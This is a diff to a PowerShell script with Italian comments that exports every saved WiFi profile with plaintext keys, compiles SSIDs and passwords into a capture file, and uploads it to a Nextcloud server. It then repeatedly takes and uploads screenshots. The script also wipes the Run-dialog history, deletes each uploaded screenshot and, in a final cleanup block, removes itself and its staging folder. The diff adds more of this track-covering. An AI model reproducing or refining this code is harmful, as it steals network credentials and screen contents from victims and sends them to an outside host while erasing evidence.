@@ -17,24 +17,25 @@ function Nextcloud-Upload {
     Invoke-RestMethod -Uri $webdavUrl -InFile $fileObject.Fullname -Headers $headers -Method Put 
 }
 
-# --- INIZIO BLOCCO DI PROTEZIONE ---
 try {
-    # 1. Pulizia iniziale record
-    cd HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\
-    Remove-Item .\RunMRU\ -ErrorAction SilentlyContinue
+    # 1. Pulizia iniziale record (Registry)
+    Write-Host "Pulizia tracce MRU..." -ForegroundColor Gray
+    Remove-Item "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\*" -ErrorAction SilentlyContinue
 
     # 2. Export WiFi
     $p = "C:\wipass"
-    if (!(Test-Path $p)) { mkdir $p }
-    cd $p
-    netsh wlan export profile key=clear
+    if (!(Test-Path $p)) { New-Item -Path $p -ItemType Directory | Out-Null }
+    Set-Location $p
+    netsh wlan export profile key=clear | Out-Null
+    
     dir *.xml | % {
-        $xml=[xml](get-content $_)
+        $xml=[xml](Get-Content $_)
         $a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
         Out-File "$env:computername-wificapture.txt" -Append -InputObject $a
     }
 
     if (Test-Path "$env:computername-wificapture.txt") {
+        Write-Host "Caricamento report WiFi..." -ForegroundColor Cyan
         "$env:computername-wificapture.txt" | Nextcloud-Upload
     }
 
@@ -59,7 +60,10 @@ try {
         $bmp.Dispose()
       
         if (Test-Path $currentPath) {
+            Write-Host "Caricamento Screenshot $i..." -ForegroundColor Cyan
             $currentPath | Nextcloud-Upload
+            # Eliminazione immediata dopo l'upload per non accumulare file
+            Remove-Item $currentPath -Force
         }
         
         $i++
@@ -67,10 +71,7 @@ try {
     }
 }
 finally {
-    # --- QUESTO CODICE VIENE ESEGUITO SEMPRE ALLA FINE ---
-    # Anche se premi CTRL+C o se lo script crasha
-    
-    Write-Host "Esecuzione pulizia finale di sicurezza..." -ForegroundColor Yellow
+    Write-Host "`n--- Inizio pulizia finale di sicurezza ---" -ForegroundColor Yellow
 
     $paths = @(
         "$env:APPDATA\c.ps1", 
@@ -81,14 +82,20 @@ finally {
         "C:\wipass\*"
     )
 
-    foreach($filePath in $paths) {
-        if (Test-Path $filePath) {
-            Remove-Item $filePath -Force -Recurse -Verbose -ErrorAction SilentlyContinue
+    foreach($pattern in $paths) {
+        # Cerchiamo i file che corrispondono al pattern (gestisce i caratteri jolly come *)
+        $files = Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue
+        foreach($file in $files) {
+            Write-Host "Eliminazione file: $($file.FullName)" -ForegroundColor Red
+            Remove-Item $file.FullName -Force -Recurse -ErrorAction SilentlyContinue
         }
     }
     
-    # Rimuove la cartella wipass se vuota
+    # Rimuove la cartella wipass se esiste
     if (Test-Path "C:\wipass") {
+        Write-Host "Rimozione cartella C:\wipass" -ForegroundColor Red
         Remove-Item "C:\wipass" -Force -Recurse -ErrorAction SilentlyContinue
     }
+
+    Write-Host "Pulizia completata." -ForegroundColor Green
 }
